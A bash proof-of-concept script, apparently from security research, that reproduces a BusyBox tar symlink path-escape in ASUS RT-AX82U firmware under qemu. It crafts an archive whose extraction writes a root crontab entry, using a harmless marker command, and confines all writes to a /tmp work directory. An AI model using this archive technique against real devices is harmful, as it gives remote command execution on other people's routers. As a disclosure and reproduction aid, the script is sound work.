#!/usr/bin/env bash
set -euo pipefail

# Non-destructive reproduction for the BusyBox tar primitive used by
# upload_server_ovpn_cert_cgi. All output stays below WORK.
ROOTFS=${ROOTFS:-"$PWD/known_firmware/extracted/00e344c92be2eceb/_FW_RT-AX82U_300438825101.zip.extracted/_RT-AX82U_combo_3.0.0.4_388_25101-g22d20d5_puresqubi.w.extracted/squashfs-root"}
QEMU_ARM=${QEMU_ARM:-/tmp/qemu-user-static-local/usr/bin/qemu-arm-static}
WORK=${WORK:-/tmp/asus-rt-ax82u-tar-proof}

test -x "$QEMU_ARM"
test -x "$ROOTFS/bin/busybox"

rm -rf "$WORK"
mkdir -p "$WORK/src" "$WORK/runtime/server_ovpn_file"
mkdir -p "$WORK/runtime/var/spool/cron/crontabs"
ln -s ../var/spool/cron/crontabs "$WORK/src/pivot"
printf '* * * * * echo ASUS_CRON_RCE_PROOF > /tmp/asus-cron-rce-marker\n' > "$WORK/src/root"

tar -C "$WORK/src" -cf "$WORK/payload.tar" pivot
tar -C "$WORK/src" --append \
  --transform='s|root|pivot/root|' \
  -f "$WORK/payload.tar" root
gzip "$WORK/payload.tar"

"$QEMU_ARM" -L "$ROOTFS" "$ROOTFS/bin/busybox" \
  tar -xvzf "$WORK/payload.tar.gz" -C "$WORK/runtime/server_ovpn_file"

CRONTAB="$WORK/runtime/var/spool/cron/crontabs/root"
test -f "$CRONTAB"
grep -q ASUS_CRON_RCE_PROOF "$CRONTAB"
printf 'CONFIRMED: firmware BusyBox escaped -C and wrote root crontab path: %s\n' "$CRONTAB"
